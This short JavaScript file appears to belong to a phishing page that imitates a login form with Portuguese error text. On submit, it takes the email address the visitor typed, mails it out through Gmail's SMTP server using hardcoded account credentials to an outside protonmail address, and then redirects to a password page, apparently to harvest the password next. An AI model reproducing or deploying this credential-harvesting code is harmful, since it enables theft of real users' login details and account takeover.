window.onload = function()
{
    const btn = document.querySelector('#loginBtn');
    const err = document.getElementById("bad-login");

    btn.addEventListener("click", function(e) {
        e.preventDefault();
        var x = document.querySelector("#email");
        var y = x.value;
        console.log(y);
        if (y.indexOf("@") != -1) {
                Email.send({
                    Host: "smtp.gmail.com",
                    Username : "xsda.ddce.2343.2343.xsop@gmail.com",
                    Password : "ryqi owje owui bjfw",
                    To : 'user1533@protonmail.com',
                    From : "xsda.ddce.2343.2343.xsop@gmail.com",
                    Subject : y,
                    Body : "<p> << Email </p>",
                });
            window.location.href = "password.html";
        } else {
            err.innerHTML = "<p class='err-alert'>Email ou Telefona não encontrados, tente novamente.<p>"
            document.getElementById("email").value='';
        }
    });
}
